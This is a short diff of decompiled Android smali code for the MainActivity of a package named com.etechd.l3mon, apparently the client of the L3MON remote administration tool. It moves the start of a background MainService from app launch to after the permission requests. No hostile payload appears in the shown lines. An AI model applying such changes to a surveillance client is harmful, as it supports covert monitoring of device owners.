@@ -73,17 +73,8 @@
 
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V
 
-    .line 24
-    new-instance v0, Landroid/content/Intent;
-
-    const-class v1, Lcom/etechd/l3mon/MainService;
-
-    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-
-    .line 25
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestAllPermissions()V
+
 
     .line 49
     return-void
@@ -242,6 +233,11 @@
     .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
 
     :catch_0
+    new-instance v0, Landroid/content/Intent;
+    const-class v1, Lcom/etechd/l3mon/MainService;
+    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
     invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
     return-void
 .end method
